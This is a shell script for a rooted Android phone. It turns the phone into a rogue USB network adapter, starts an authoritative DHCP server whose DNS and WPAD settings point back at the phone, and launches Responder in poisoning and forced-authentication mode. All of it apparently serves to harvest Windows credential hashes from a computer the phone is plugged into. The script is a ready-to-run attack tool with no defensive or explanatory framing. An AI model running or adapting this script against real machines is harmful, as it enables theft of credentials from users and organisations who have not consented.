#!/bin/sh
StaticIP="192.168.48.251"
Domain="domain.local"
DHCPRange="192.168.48.200,192.168.48.250"
DHCPNETMASK="255.255.255.0"
DHCPBROADCAST="192.168.48.255"

# Change to script directory
dirname=$0
cd "${dirname%/*}"
curdir=`pwd`

# Identify temp directory
if [ -d "/tmp" ]; then
  TEMP="/tmp"
elif [ -d "/data/local/tmp" ]; then #in case we are running inside the android environment
  TEMP="/data/local/tmp"
elif [ -d "/cache" ]; then 
  TEMP="/cache"
else 
	echo "TEMP folder cannot be found, setting it to pwd"
	TEMP=`pwd`
fi

# Check USB state
# Save USB current configuration in temp dir
prevconfig=`getprop sys.usb.config`
if [[ $prevconfig == *"rndis"* ]] ; then
	# Skip re-setting usb to rndis if already set.
	echo 'Tethering seems to be active ... continuing without restarting it' >&2
elif [[ ! -z $prevconfig ]]; then
	# Save configuration and set USB to rnids mode
	echo "${prevconfig}" > $TEMP/usb_tether_prevconfig
	setprop sys.usb.config 'rndis,adb'
	echo "Enabling Tethering"
	# Wait for usb interface to change state
	until [ "`getprop sys.usb.state`" = 'rndis,adb' ] ; do sleep 1 ; done
else
	echo "Cannot determine usb state:" `getprop sys.usb.state`
fi
sleep 1

# Identify Tethering interface
if [[ `ip link show usb0 2>/dev/null` ]]; then
        TetherIface="usb0"
elif [[ `ip link show rndis0 2>/dev/null` ]]; then
        TetherIface="rndis0"
else
        echo "Please enter Tetehring interface:"
        read TetherIface
fi

sleep 1

# Set up forwarding from usb network to external network, if such route exist
route=`ip route show default`
if [[ -n $route ]] && [[ ! $route == *$TetherIface* ]]; then
	NetIroute=`ip route show default`
	# Old bash magic because cut is not available in Android 4.x
	NetIroute="${NetIroute#*' '*' '}" 	# Gets string after second whitespace
	NetIface="${NetIroute%%' '*}"		# Gets string until first whitespace
	# Save interface name
	echo $NetIface > $TEMP/netiface.name
	# Enable forwarding
	echo "Enabling Forwarding from $TetherIface to $NetIface"
	echo 1 > /proc/sys/net/ipv4/ip_forward

	# Set up NATing with iptables
	echo "Enabling NATing"
	/system/bin/iptables -w -t nat -A natctrl_nat_POSTROUTING -o $NetIface -j MASQUERADE
	/system/bin/iptables -w -A natctrl_FORWARD -i $NetIface -o $TetherIface -m state --state ESTABLISHED,RELATED -g natctrl_tether_counters
	/system/bin/iptables -w -A natctrl_FORWARD -i $TetherIface -o $NetIface -m state --state INVALID -j DROP
	/system/bin/iptables -w -A natctrl_FORWARD -i $TetherIface -o $NetIface -g natctrl_tether_counters
	/system/bin/iptables -w -A natctrl_tether_counters -i $TetherIface -o $NetIface -j RETURN
	/system/bin/iptables -w -A natctrl_tether_counters -i $NetIface -o $TetherIface -j RETURN
	/system/bin/iptables -w -D natctrl_FORWARD -j DROP
	/system/bin/iptables -w -A natctrl_FORWARD -j DROP
fi

# Set-up Tethering interface details
echo "Bringing up Tethering interface"
ip rule add from all lookup main
ip addr flush dev $TetherIface
ip addr add $StaticIP/24 broadcast $DHCPBROADCAST dev $TetherIface
ip link set $TetherIface up
sleep 1

# Set up DHCP server
echo "Setting up DHCP"
dnsmasq --pid-file=$TEMP/usb_tether_dnsmasq.pid \
--interface=$TetherIface \
--port=0 \
--filterwin2k \
--no-resolv \
--domain=$Domain \
--server=$StaticIP \
--cache-size=1000 \
--dhcp-range=$DHCPRange,$DHCPNETMASK,$DHCPBROADCAST \
--dhcp-option=6,$StaticIP \
--dhcp-option=40,$Domain \
--dhcp-option=252,http://$StaticIP/wpad.dat \
--dhcp-lease-max=253 \
--dhcp-authoritative \
--conf-file=/dev/null \
--dhcp-leasefile=$TEMP/usb_tether_dnsmasq.leases < /dev/null

sleep 1

# Start Responder
echo "Starting Responder"

# Identify Python interpreter
Python=`which python 2>/dev/null`

# Check for errors
if [ $? -ne 0 ]; then
#which does not exist or something happened
	if [ -e "/usr/bin/python" ]; then
		Python="/usr/bin/python"
	fi
fi

# Python not found in PATH
# Check if qPython application is installed
if [ -z $Python ];then	
	qPythonPackage=`pm list packages qpython`
	if [ -z $qPythonPackage ]; then
		echo "Python not found please install qPython"
		exit 1;
	else
		# Identify android version and call correct script (Android 5+ needs PIE bypass)
		qPython=${qPythonPackage:8:128} # | cut -d: -f2
		AndroidVersion=`getprop ro.build.version.release`
		if [[ ${AndroidVersion:0:1} -ge 5 ]]; then
			qPythonsh="qpython-android5.sh"
		else
			qPythonsh="qpython.sh"	
		fi
		# Set Python interpreter to qPython 
		Python="sh /data/data/$qPython/files/bin/$qPythonsh"
	fi
fi

# Check if Responder directory exists
if [ ! -d "$curdir/Responder" ]; then
	echo "Responder directory missing: $curdir/Responder" 
	exit 1
else
# Start Responder and listen for events. Ctrl-C to exit
	echo "Starting Responder.py, Ctrl-C to exit"
	$Python $curdir/Responder/Responder.py -I $TetherIface -f -w -r -d -F 
	echo $! > $TEMP/responder.pid
fi
